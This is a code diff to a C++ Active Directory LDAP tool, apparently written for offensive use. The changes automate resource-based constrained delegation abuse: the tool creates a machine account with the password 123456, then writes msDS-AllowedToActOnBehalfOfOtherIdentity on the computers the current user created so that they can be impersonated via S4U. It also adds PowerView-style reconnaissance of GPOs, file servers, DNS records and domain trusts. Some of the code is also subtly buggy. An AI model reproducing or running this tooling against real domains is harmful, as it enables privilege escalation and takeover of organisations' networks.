@@ -168,6 +168,7 @@ DWORD LDAP_API::bind(){
 }
 
 /*大部分都参考了ske大师兄的，因为写的比较完全了，比如基于资源的约束委派方面上相关的SID获取用户名其实都写了*/
+// 方法都不完善，如果以后要扩充的话，这个search方法需要重写的
 vector<string> LDAP_API::search(string filterGrammar, string dn, PCHAR searchAttabuite[]){
 	vector<string> vString;
 	DWORD dwRet = ldap_search_s(this->pLdapInstance, (PSTR)dn.c_str(), LDAP_SCOPE_SUBTREE, (PSTR)filterGrammar.c_str(),
@@ -205,22 +206,22 @@ vector<string> LDAP_API::search(string filterGrammar, string dn, PCHAR searchAtt
 					while (pAttribute != NULL){
 						// 这种情况就是如果ppValue是sid的时候，需要手动进行转换成用户下，否则输出是未知数据
 						if (CompareString(GetThreadLocale(), NORM_IGNORECASE, pAttribute, lstrlen(pAttribute), "mS-DS-CreatorSID", lstrlen("mS-DS-CreatorSID")) == 2){
-							LDAP_BERVAL** berVal;
+							LDAP_BERVAL** berVal = NULL;
 							string domainUser;
-							PSID pSid;
+							PSID pSid = NULL;
 							if (berVal = ldap_get_values_len(this->pLdapInstance, pEntry, pAttribute)){
 								for (int i = 0; berVal[i]; i++)
 								{
 									string sid = ConvertToStringSid((const unsigned char*)berVal[i]->bv_val, berVal[i]->bv_len);
 									ConvertStringSidToSid(sid.c_str(), &pSid);
 									domainUser = sid2user(pSid, this->ldapServerAddr.c_str());
-									cout << "\t" << pAttribute << "=" << sid << " ----> " << domainUser;
+									cout << pAttribute << "=" << sid << " ----> " << domainUser;
 								}
 								ldap_value_free_len(berVal);
 							}
 						}
 						else if (CompareString(GetThreadLocale(), NORM_IGNORECASE, pAttribute, lstrlen(pAttribute), "objectSid", lstrlen("objectSid")) == 2){
-							LDAP_BERVAL** berVal;
+							LDAP_BERVAL** berVal = NULL;
 							if (berVal = ldap_get_values_len(this->pLdapInstance, pEntry, pAttribute)){
 								for (int i = 0; berVal[i]; i++)
 								{
@@ -230,19 +231,33 @@ vector<string> LDAP_API::search(string filterGrammar, string dn, PCHAR searchAtt
 								ldap_value_free_len(berVal);
 							}
 						}
+						else if (CompareString(GetThreadLocale(), NORM_IGNORECASE, pAttribute, lstrlen(pAttribute), "dnsRecord", lstrlen("dnsRecord")) == 2){
+							LDAP_BERVAL** berVal = NULL;
+							berVal = ldap_get_values_len(this->pLdapInstance, pEntry, pAttribute);
+							if (berVal = ldap_get_values_len(this->pLdapInstance, pEntry, pAttribute)){
+								char szAddrBuffer[0x10] = { 0 };
+								DNS_RPC_RECORD* d = (DNS_RPC_RECORD*)berVal[0]->bv_val;
+								sprintf(szAddrBuffer, "%d.%d.%d.%d", d->addr.address[0], d->addr.address[1], d->addr.address[2], d->addr.address[3]);
+								cout << "\t" << pAttribute << szAddrBuffer << endl << " ";
+								ldap_value_free_len(berVal);
+							}
+							
+						}
 						else{
 							// get common attribute
 							ppValue = ldap_get_values(this->pLdapInstance, pEntry, pAttribute);
-							cout << "\t" << pAttribute << "=" << *ppValue;
+							cout << "\t" << pAttribute << "=" << *ppValue << " ";
 							vString.push_back(*ppValue);
+							
+							// Free memory.
+							if (ppValue != NULL)
+								ldap_value_free(ppValue);
+
+							ppValue = NULL;
+							ldap_memfree(pAttribute);
+							
 						}
-						
-						// Free memory.
-						if (ppValue != NULL)
-							ldap_value_free(ppValue);
-						 
-						ppValue = NULL;
-						ldap_memfree(pAttribute);
+					
 
 						// Get next attribute name.
 						pAttribute = ldap_next_attribute(
@@ -287,12 +302,21 @@ void LDAP_API::searchResourceBasedConstrainedDelegation(){
 
 vector<string> LDAP_API::getObjectSid(string pcName){
 	PCHAR pAttributes[] = { "objectSid", NULL };
-	string distinguishedName = "(sAMAccountName=" + pcName + "$)";
-	return this->search(distinguishedName.c_str(), this->baseDn, pAttributes);
+	string grammarString = "(sAMAccountName=" + pcName + "$)";
+	return this->search(grammarString.c_str(), this->baseDn, pAttributes);
 }
 
+string LDAP_API::getComputerDn(){
+	PCHAR pAttributes[] = { "distinguishedName", NULL };
+	TCHAR szBufferComputerName[MAX_PATH] = { 0 };
+	DWORD dwSize;
+	GetComputerName(szBufferComputerName, &dwSize);
+	string grammarString = "(sAMAccountName=" + string(szBufferComputerName) + "$)";
+	vector<string> vString = this->search(grammarString.c_str(), this->baseDn, pAttributes);
+	return vString[0];
+}
 
-string LDAP_API::addComputer(string pcName){
+string LDAP_API::addComputer(string pcName, string dn){
 	LDAPMod m1, m2, m3, m4, m5, m6;
 
 	string dnsHostNameString = pcName + "." + this->domainName;
@@ -330,13 +354,12 @@ string LDAP_API::addComputer(string pcName){
 	m5.mod_type = "objectClass";
 	m5.mod_values = objectClassVals;
 	
-	TCHAR* servicePrincipalNameVals[] = { 
-		"HOST/test222.hengge.com", 
-		"RestrictedKrbHost/test222.hengge.com", 
-		"HOST/test222",
-		"RestrictedKrbHost/test222",	
-		NULL 
-	};
+	string a1 = "HOST/" + pcName + "." + this->domainName;
+	string a2 = "RestrictedKrbHost/" + pcName + "." + this->domainName;
+	string a3 = "HOST/" + pcName;
+	string a4 = "RestrictedKrbHost/" + pcName;
+	
+	TCHAR* servicePrincipalNameVals[] = { (TCHAR*)a1.c_str(), (TCHAR*)a2.c_str(), (TCHAR*)a3.c_str(), (TCHAR*)a4.c_str(),NULL };
 	m6.mod_op = LDAP_MOD_ADD;
 	m6.mod_type = "ServicePrincipalName";
 	m6.mod_values = servicePrincipalNameVals;
@@ -344,11 +367,13 @@ string LDAP_API::addComputer(string pcName){
 	LDAPMod* pModAttrs[7] = { &m1, &m2, &m3, &m4, &m5, &m6, NULL };
 	//string userSid = this->getCurrentUserSid();
 	//MACHINE_ACCOUNT_ATTRIBUTE machineAccountAttribute;
-	DWORD dwRet = ldap_add_ext_s(this->pLdapInstance, "CN=test222,CN=Computers,DC=hengge,DC=com", pModAttrs, NULL, NULL);
+	
+	
+	DWORD dwRet = ldap_add_ext_s(this->pLdapInstance, (PSTR)dn.c_str(), pModAttrs, NULL, NULL);
 	if (dwRet == LDAP_SUCCESS){
 		cout << "[+] LDAP::addComputer Add Successed, Password is 123456" << endl;
 		delete bv.bv_val;
-		vector<string> vString =  this->getObjectSid("test222");
+		vector<string> vString = this->getObjectSid(pcName);
 		return vString[0];
 	}else{
 		cout << "[-] LDAP::addComputer Add Failed, The Error is " << dwRet << endl;
@@ -357,22 +382,52 @@ string LDAP_API::addComputer(string pcName){
 	}
 }
 
-void LDAP_API::addDnsRecord(){
+// https://www.cnblogs.com/unicodeSec/p/15348117.html 思路来源
+void LDAP_API::addDnsRecord(string dnsName, string ipName){
+	string dn = "DC=" + dnsName + ",DC=" + this->domainName + ",CN=MicrosoftDNS,DC=DomainDnsZones," + this->baseDn;
+	// template: "DC=WIN-SKE-PC,DC=hengge.com,CN=MicrosoftDNS,DC=DomainDnsZones,DC=hengge,DC=com"
+	
+
+	/*
+	当字符串字节数小于128的时候:
+
+	04 0a                              ; OCTET_STRING (a Bytes)
+	|     1e 08 00 55 00 73 00 65  00 72  ;   ...U.s.e.r
+
+	解析
+
+	04 代表 OCTET_STRING 这个结构(参看基本类型汇总表)
+
+	0a 代表 字节的数量（a Bytes）
+	*/
+	
 	
 }
 
-
-void LDAP_API::updateResourceBasedConstrainedDelegation(){
-	wstring addComputerSidString = string2Wstring(addComputer("test222"));
-	//wstring addComputerSidString = L"S-1-5-21-4223269421-3390898629-3395902804-1132"; // 新添加机器的objectSid
+// https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/ 思路来源
+void LDAP_API::updateResourceBasedConstrainedDelegation(string pcName){
 	string currentUserCreatorSid = this->getCurrentUserSid();
 	cout << "[+] CurrentCreatorSid ----> "  << currentUserCreatorSid << endl;
+	
 	vector<string> vCnString;
 	// 找到当前mS-DS-CreatorSID为当前用户的CN
 	string fmtCreatorSid = "(mS-DS-CreatorSID=" + currentUserCreatorSid + ")";
+	PCHAR pAttributes[] = { "cn", NULL };
 	cout << "[+] Checking " << fmtCreatorSid << endl;
-	PCHAR pAttributes[] = { "cn", NULL }; 
 	vCnString = this->search(fmtCreatorSid, this->baseDn, pAttributes);
+
+	DWORD dwComputerSize;
+	TCHAR currentComputerName[MAX_PATH] = { 0 };
+	GetComputerName(currentComputerName, &dwComputerSize);
+	regex_constants::match_flag_type fonly = regex_constants::format_first_only;
+	regex matchString(currentComputerName);
+
+	string computerDnString = this->getComputerDn();
+	cout << "[+] Getting computerDn ----> " << computerDnString << endl;
+	string addComputerDn = regex_replace(computerDnString, matchString, pcName);
+	wstring addComputerSidString = string2Wstring(addComputer(pcName, addComputerDn));
+	//wstring addComputerSidString = L"S-1-5-21-4223269421-3390898629-3395902804-1132"; // 新添加机器的objectSid
+	
 	if (!vCnString.empty()){
 		// 遍历取出可以基于资源委派的机器名
 		// 对所有可以进行资源委派的机器名设置对应的字段msDS-AllowedToActOnBehalfOfOtherIdentity为当前的用户SID
@@ -392,12 +447,12 @@ void LDAP_API::updateResourceBasedConstrainedDelegation(){
 			
 			IDirectoryObject* pDirObject = NULL;
 			HRESULT hr;
-			wstring cnWstring = string2Wstring(vCnString[i]);
-			wstring computerDn = L"LDAP://CN=" + cnWstring + L",CN=Computers,DC=hengge,DC=com";
-			//wstring computerDn = L"LDAP://CN=test1,CN=Computers,DC=hengge,DC=com";
-			wcout << L"[+] " << computerDn << endl;
+			
+			wstring computerDnWstring = L"LDAP://" + string2Wstring(regex_replace(computerDnString, matchString, vCnString[i], fonly));
+			wcout << L"[+] " << computerDnWstring << endl;
+
 			CoInitialize(NULL);
-			hr = ADsOpenObject(computerDn.c_str(),
+			hr = ADsOpenObject(computerDnWstring.c_str(),
 				NULL,
 				NULL,
 				ADS_SECURE_AUTHENTICATION,
@@ -428,13 +483,18 @@ void LDAP_API::updateResourceBasedConstrainedDelegation(){
 				
 				if (SUCCEEDED(hr)){
 					cout << "[+] msDS-AllowedToActOnBehalfOfOtherIdentity Attributes Add Succussed" << endl;
-					wcout << "[+] " << addComputerSidString << " Can Via S4u2self To Exploit " << cnWstring << endl;
+					cout << "[+] " << pcName << "$" << " Can Via S4u2self To Exploit " << vCnString[i] << "$" << endl;
 				}
 				else
 					cout << "[-] msDS-AllowedToActOnBehalfOfOtherIdentity Attributes Add Failed, The Error is " << LdapGetLastError() << endl;;
 				
-				// 释放
+				// 释放相关的内存
 				pDirObject->Release();
+				this->closeLdapConnection();
+				if (pSa != NULL){
+					delete pSa;
+					pSa = NULL;
+				}
 			}
 			
 		}
@@ -449,7 +509,37 @@ void LDAP_API::updateResourceBasedConstrainedDelegation(){
 	}
 }
 
+// https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/ 思路来源
 void LDAP_API::updatePrivilege(){
 	// 本地服务账户的权限提升
+}
 
+// https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1 思路来源
+void LDAP_API::searchGPO(){
+	string dn = "CN=Policies,CN=System," + this->baseDn;
+	PCHAR pAttributes[] = { "gPCFileSysPath", NULL };
+	this->search("(objectCategory=groupPolicyContainer)", dn, pAttributes);
+
+}
+
+
+// https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1 思路来源
+void LDAP_API::searchDomainFileServer(){
+	PCHAR pAttributes[] = { "homedirectory", "scriptpath", "profilepath", NULL };
+	this->search("(&(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(homedirectory=*)(scriptpath=*)(profilepath=*)))", this->baseDn, pAttributes);
+}
+
+
+// dnscmd 思路来源
+void LDAP_API::searchDnsRecord(){
+	string dn = "DC=" + this->domainName + ",CN=MicrosoftDNS,DC=DomainDnsZones," + this->baseDn;
+	PCHAR pAttributes[] = { "name", "dnsRecord", NULL };
+	this->search("(objectCategory=dnsNode)", this->baseDn, pAttributes);
+}
+
+// https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 思路来源
+
+void LDAP_API::searchTrustDomain(){
+	PCHAR pAttributes[] = { "TargetName", NULL };
+	this->search("(objectClass=trustedDomain)", this->baseDn, pAttributes);
 }
